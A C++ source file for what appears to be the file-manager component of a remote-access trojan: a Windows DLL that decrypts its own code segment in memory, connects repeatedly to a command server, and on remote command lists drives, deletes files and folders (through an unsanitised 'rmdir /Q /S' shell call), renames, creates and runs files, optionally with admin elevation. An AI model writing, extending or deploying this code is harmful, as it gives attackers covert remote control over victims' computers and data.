#include "../Core/ComponentUtilities.h"
#include "../Core/PELoader.h"
#include "../Core/TcpShortDef.h"
#include <fstream>
#include <shellapi.h>
#include <sstream>

//Components required defines
#define COMPONENT_TYPE ClientTypes::ftp

#pragma section(segment_qdata, read)
store_variable(segment_qdata) QDATA_STORAGE storage { {0}, 1 };

HMODULE thisDll;
FILE_MUTEX_STRUCT thisLock;

int main();


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	switch (fdwReason) {
		case DLL_PROCESS_ATTACH:
		{
			thisDll = hinstDLL;
			srand(time(NULL));
			break;
		}
		case DLL_PROCESS_DETACH:
		{
			break;
		}
		case DLL_THREAD_ATTACH:
		{
			break;
		}
		case DLL_THREAD_DETACH:
		{
			break;
		}
	}
	
	return true;
}

void CALLBACK debug(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow){
	// Although debug will be exported only in debug version add this checkpoint

#ifdef  _DEBUG
	main();
#endif
}

//Error code should be 1000
//This is the signature for thread function
unsigned int WINAPI coInitComponent(LPVOID lpParameter) {
	DBG("Intro ....Locking");
	thisLock = getComponentLock(thisDll);

	if (!thisLock.locked) {
		DBG("Intro ....FAILED");
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}

	DBG("Intro ....Decrypting module in memory");

	if (!revertRelocatorChanges(thisDll)) {
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}
	if (!decryptSegmentInMemory(thisDll, segment_crypt)) {
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}
	if (!rebaseModuleSegment(thisDll)) {
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}

	DBG("Intro ....main() called");
	main();

	return 1;	//doesn't matter anymore. Just the first errors are important(for the loader)
}

//Returns version from data segment
DWORD getVersion() {
	return storage.version;
}

//Returns the component type
DWORD getType() {
	return (DWORD)COMPONENT_TYPE;
}


//Encripted side


// Returns the path suffixed with the * wildcard.
// The path returned will always end in "\*"
std::string getWildcardedPath(std::string mStringBuilder) {
	if (mStringBuilder[mStringBuilder.size() - 1] == '*') return mStringBuilder;
	if (mStringBuilder[mStringBuilder.size() - 1] == '\\') return mStringBuilder + "*";
	return mStringBuilder + "\\" + "*";
}
void removeWildcardPath(std::string& mStringBuilder) {
	if (mStringBuilder[mStringBuilder.size() - 1] == '*') mStringBuilder.resize(mStringBuilder.size() - 1);
}

store_code(segment_crypt) bool sendFtpEmptyResponse(HorizonClient& client, std::string message) {
	PACKET_HEADER sPacket;
	uint64_t noEntries = 0;

	if (!sendHeader(PacketDataTypes::enum_folders_and_files, 8, message)) return false;
	if (!sendData((char*)&noEntries, 8)) return false;

	return true;
}

store_code(segment_crypt) bool netloop(HorizonClient& client) {
	std::unique_ptr<PACKET_HEADER> header(new PACKET_HEADER);
	
	if (!recvHeader(header.get())) return false;

	uint64_t noEntries = 0;

	switch ((PacketDataTypes)header->data_type) {
		case PacketDataTypes::enum_drives:
		{
			WIN32_FIND_DATAA fileData;
			char drive_path[128] = "?:\\";		// ntstring

			ZeroMemory(&fileData, sizeof(WIN32_FIND_DATAA));

			for (char c = 'Z'; c >= 'A'; --c) {
				drive_path[0] = c;
				if (GetDriveTypeA(drive_path) == DRIVE_FIXED || GetDriveTypeA(drive_path) == DRIVE_REMOVABLE)  noEntries++;
			}

			if (!sendHeader(PacketDataTypes::enum_drives, 8 + noEntries * sizeof(WIN32_FIND_DATAA), "")) return false;
			if (!sendData((char*)&noEntries, 8)) return false;

			fileData.dwFileAttributes = FILE_ATTRIBUTE_DIRECTORY;

			for (char c = 'Z'; c >= 'A' && noEntries; --c) {
				drive_path[0] = c;

				if (GetDriveTypeA(drive_path) == DRIVE_FIXED || GetDriveTypeA(drive_path) == DRIVE_REMOVABLE) {
					strncpy_s(fileData.cFileName, drive_path, _TRUNCATE);
					noEntries--;

					if (!sendData((char*)&fileData, sizeof(WIN32_FIND_DATAA))) return false;
				}
			}
			break;
		}
		case PacketDataTypes::enum_folders_and_files:
		{
			WIN32_FIND_DATAA fileData;
			HANDLE firstFile;
			std::string path;

			path = getWildcardedPath(header->arguments);
			firstFile = FindFirstFileA(path.c_str(), &fileData);

			if (firstFile != INVALID_HANDLE_VALUE) {
				do {
					if (strcmp(fileData.cFileName, ".") != 0 && strcmp(fileData.cFileName, "..") != 0) noEntries++;
				} while (FindNextFileA(firstFile, &fileData) != 0);

				FindClose(firstFile);
			} else {
				if (!sendFtpEmptyResponse(client, "Error opening the directory!")) return false;
				break;
			}

			if (noEntries == 0) {
				if (!sendFtpEmptyResponse(client, "No files here!")) return false;
				break;
			}

			firstFile = FindFirstFileA(path.c_str(), &fileData);

			if (firstFile != INVALID_HANDLE_VALUE) {
				if (!sendHeader(PacketDataTypes::enum_folders_and_files, 8 + noEntries * sizeof(WIN32_FIND_DATAA), "")) return false;
				if (!sendData((char*)&noEntries, 8)) return false;

				do {
					if (strcmp(fileData.cFileName, ".") != 0 && strcmp(fileData.cFileName, "..") != 0) {
						if (!noEntries) break;

						if (!sendData((char*)&fileData, sizeof(WIN32_FIND_DATAA))) {
							FindClose(firstFile);
							return false;
						}

						noEntries--;
					}
				} while (FindNextFileA(firstFile, &fileData) != 0);
			} else {
				if (!sendFtpEmptyResponse(client, "Error opening the directory!")) return false;

				break;
			}

			FindClose(firstFile);
			break;
		}
		case PacketDataTypes::delete_file:
		{
			std::string wantedFolder = getPacketParamValue(header->arguments, "wantedFile");

			DeleteFileA(wantedFolder.c_str());

			break;
		}
		case PacketDataTypes::delete_folder:
		{
			std::string wantedFolder = getPacketParamValue(header->arguments, "wantedFile");

			// Note : In a future release use SHFileOperation or IFileOperation
			system((std::string("rmdir /Q /S \"") + wantedFolder + std::string("\"")).c_str()   );

			break;
		}
		case PacketDataTypes::rename:
		{
			std::string wantedFolder = getPacketParamValue(header->arguments, "wantedFile");
			std::string newName = getPacketParamValue(header->arguments, "newName");

			MoveFileA(wantedFolder.c_str(), newName.c_str());

			break;
		}
		case PacketDataTypes::create_folder:
		{
			std::string wantedFolder = getPacketParamValue(header->arguments, "wantedFile");

			CreateDirectoryA(wantedFolder.c_str(), NULL);

			break;
		}
		case PacketDataTypes::create_file:
		{
			std::string wantedFolder = getPacketParamValue(header->arguments, "wantedFile");
			HANDLE lpNewFileHandle = CreateFileA(wantedFolder.c_str(), GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

			if (lpNewFileHandle) CloseHandle(lpNewFileHandle);

			break;
		}
		
		case PacketDataTypes::run:
		{
			std::string wantedFolder = getPacketParamValue(header->arguments, "wantedFile");
			std::string invokeAdmin = getPacketParamValue(header->arguments, "invokeAdmin");

			SHELLEXECUTEINFOA shExInfo;

			memset(&shExInfo, 0, sizeof(SHELLEXECUTEINFO));

			shExInfo.cbSize = sizeof(shExInfo);
			shExInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
			shExInfo.hwnd = 0;
			shExInfo.lpFile = wantedFolder.c_str();
			shExInfo.lpParameters = "";
			shExInfo.lpDirectory = 0;
			shExInfo.nShow = SW_SHOW;
			shExInfo.hInstApp = 0;

			if (invokeAdmin == "true") shExInfo.lpVerb = "runas";

			ShellExecuteExA(&shExInfo);

			break;
		}
	}

	return true;
}

void callback_userdescriptorChanged(const USERDESCRIPTOR* new_user) {
	updateStoredDescriptor(new_user);
}

store_code(segment_crypt) int main() {
	while (true) {
		try {
			DBG("Connecting");

			std::unique_ptr<USERDESCRIPTOR> user=loadStoredDescriptor(getVersion(), COMPONENT_TYPE);
			HorizonClient client(getNextDNS(),user.get(),thisDll, callback_userdescriptorChanged);

			DBG("Connected");

			if (!client.authentificate(__LINE__)) {
				DBG("Could not authentificate");
				continue;
			}

			// Message pump
			while (true) {
				if (!netloop(client)) break;
			}
			client.closeClient();

			DBG("Connection ended");

		} catch (std::exception ex) {
			DBG("Exeption");
			DBG(ex.what());
			Sleep(1000);
		}
	}

	return 0;
}